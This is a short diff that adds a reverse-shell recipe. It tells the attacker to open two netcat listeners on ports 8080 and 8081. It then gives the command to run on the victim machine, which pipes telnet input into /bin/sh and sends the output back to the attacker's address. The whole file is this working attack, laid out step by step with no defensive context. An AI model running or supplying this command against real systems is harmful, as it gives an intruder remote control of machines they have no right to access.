@@ -1,0 +1,6 @@
+In Attacker machine start two listeners:
+nc -lvp 8080
+nc -lvp 8081
+
+In Victime machine run below command:
+telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
